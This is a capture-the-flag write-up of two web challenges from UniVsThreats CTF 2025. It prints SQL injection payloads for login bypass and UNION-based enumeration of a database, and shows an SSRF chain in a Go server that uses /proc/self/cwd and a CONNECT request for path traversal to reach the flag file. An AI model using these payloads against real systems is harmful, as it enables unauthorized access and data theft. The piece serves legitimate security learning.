# UniVsThreats CTF 2025

## Table of Contents
- [error=-303](#error-303)
- [internal_Verbs Challenge](#internal_Verbs)

## error=-303
>You don’t ask for access. You carve it out.

The challenge was a classic SQLi challenge. 
It start with login form where usually can be bypass with Boolean-Based SQLi by make it always true.
```
' or '1'='1' -- -
```

After successfully bypass the login, it redirect to search product page. Here I tried to search with input ‘a’ however it show no product found. So I think it need to give full name of the product to show output.
Next I try Union-Based SQLi since it like past ctf challenge. So try to find the number of columns by increase number of NULL and also the active database until show output.
```
' UNION SELECT NULL, NULL, NULL, DATABASE() -- -
```

![find database](https://github.com/user-attachments/assets/d5633e9a-c71e-46d2-8712-3964713cf9e6)

Then after found the database name with 4 column we enumerate the tables:
```
' UNION SELECT table_name, NULL, NULL, NULL FROM information_schema.tables WHERE table_schema = DATABASE() -- -
```
![get table](https://github.com/user-attachments/assets/1167d881-94a4-4bab-9965-9459cf6f6c0b)

We discovered that it contain 2 table which one that seem have the flag is "secrets"
Next, we start enumerate the colums in the secrets table:
```
' UNION SELECT column_name, NULL, NULL, NULL FROM information_schema.columns WHERE table_name='secrets' AND table_schema = DATABASE() -- -
```
![column secrets table](https://github.com/user-attachments/assets/dae60324-8965-40b5-ad5e-3f77667dc94b)

The table contains 2 columns: "flag" and "id". We extract the flag with
```
' UNION SELECT NULL, flag, NULL, NULL FROM secrets -- -
```
![get the first flag](https://github.com/user-attachments/assets/5b3ab5e2-a2a3-4b50-918e-bd7b7dd193ac)

First part of the flag is obtained!

For the next part of the flag we enumerate other table but not found and go enumerate other available database:
```
' UNION SELECT NULL, schema_name, NULL, NULL FROM information_schema.schemata -- -
```
![AVAILABLE DATABASE](https://github.com/user-attachments/assets/d09c872d-5e1f-4620-a2dc-7d235328f9bc)

We found database named "password_reset"
So same as earlier method we enumerate the table and column and retrieve the second part of the flag.
There is "users" table only and there are many column so among multiple columns, we look for ones most likely to store a flag.
![flag](https://github.com/user-attachments/assets/1a1a23f5-d2c4-4116-af7e-d10d4f38d71c)

```
UVT{Th3_sy5t3M_7ru5Ts_1tS_oWn_9r4Mmar_..._S0_5tR1ng5_4r3_m0r3_tHaN_qu3r13s_1n_th3_3nd}
```

## internal_Verbs
>You've found an internal administration server exposed to the internet. It looks simple at first, but certain sensitive endpoints require proper authorization to access.
>Explore the server carefully — not everything responds the same way to every verb.
>Can you bypass the restrictions and retrieve the hidden flag?

The File structure:

```
mv /server /tmp/$RAND_DIR/
mv /public /tmp/$RAND_DIR/
mv /flag.txt /tmp/$RAND_DIR/flag_$RAND_DIR.txt
```

The challenge provide code to review. From the code we found endpoint available

```
	http.HandleFunc("/admin", handlers.AdminHandler)
	http.HandleFunc("/", handlers.HomeHandler)
	http.HandleFunc("/about", handlers.AboutHandler)
	http.HandleFunc("/request/", handlers.RequestHandler)
	http.HandleFunc("/whoami", handlers.UserHandler)
	http.HandleFunc("/disk", handlers.DiskHandler)
	http.HandleFunc("/list/", handlers.ListHandler)
	http.HandleFunc("/view/", handlers.ViewHandler)
	http.HandleFunc("/link", handlers.LinkHandler)
```
The admin, list and view and link need to be from local host :
```
return strings.HasPrefix(host, "127.0.0.1") || strings.HasPrefix(host, "[::1]") || strings.HasPrefix(host, "localhost:")
```
and then must has the authorization header where we just add ad request using burpsuite
```
if authHeader != "Bearer YWRtaW46YWRtaW4=" {
```

So to make our request to be from local host we use SSRF vulnurabliti which can be use on request endpoint

```
targetURL = decodedTarget
...
req, err := http.NewRequest(method, targetURL, nil)
...
resp, err := client.Do(req)
```
the request handler take value after /request/ and  URLdecode it and if not whoami or disk it set it as target url and make a request to it.

So from this we can bypass the local host condition.

Then we try to /list endpoint where it can list all file inside public but not other folder.
Then we try to view notes.txt inside the public folder it open and show the content.
Next, try path traversal to read outside of public folder since the /view endpoint it append our input to ./public/
```
cleanPath := "./public/" + filepath.Clean(path)
```
and the filepath.Clean(path) make our path traversal fails since it remove the ../

however there is something i forgot which is the most importand part before we can read the flag which is find the dir name.
```
mv /flag.txt /tmp/$RAND_DIR/flag_$RAND_DIR.txt
```
to be able to read the flag we need to fund the rand_dir name. Here we take a look on other endpoint and found that /link endpoint enable to use /proc/self. so from /proc/self/cwd we can get current working directory
```
/request/http%3A%2F%2F127.0.0.1%3A40048%2Flink%3Fpath%3D%2Fproc%2Fself%2Fcwd
```
```
Resolved path: /tmp/dwN7SbNEMGyC
```

so the flag path will be : /tmp/dwN7SbNEMGyC/flag_dwN7SbNEMGyC.txt

ok now we got the name of the flag but i try to view it but failed 
maybe because of filepath.Clean (which clean the ../ but the value must start with / or \ to be effective) and r.URL.Path (make the value contain / in at the start) [Golang Traversla](https://rowin.dev/blog/preventing-path-traversal-attacks-in-go)

```
Cannot stat file: ..\flag_dwN7SbNEMGyC.txt
```
So until end of the ctf cannot get the flag. 
so after the ctf they say that we can use CONNECT which can avoid the canonicalization. [Golang Hacktrick](https://hacktricks.boitatech.com.br/pentesting/pentesting-web/golang)

```
CONNECT /request/http:%2f%2f127.0.0.1:40048/view/../flag_dwN7SbNEMGyC.txt?method=CONNECT HTTP/1.1
```

the flag: ``` UVT{4ft3r_a_l0t_0f_st3ps_1t_y0u_f1nally_g0t_th3_fl4g_CONGR4TZZZZ} ```

## Conclusion
The challenge is nice even though just 2 challenge I do and solved and the sql challenge is same like CyberXCTF challenge but the ssrf challenge is the first time I solve it. 
Past ctf challenge there is ssrf challenge and localhost condition but i cannot bypass it but this ctf I manage which show a little improvement.
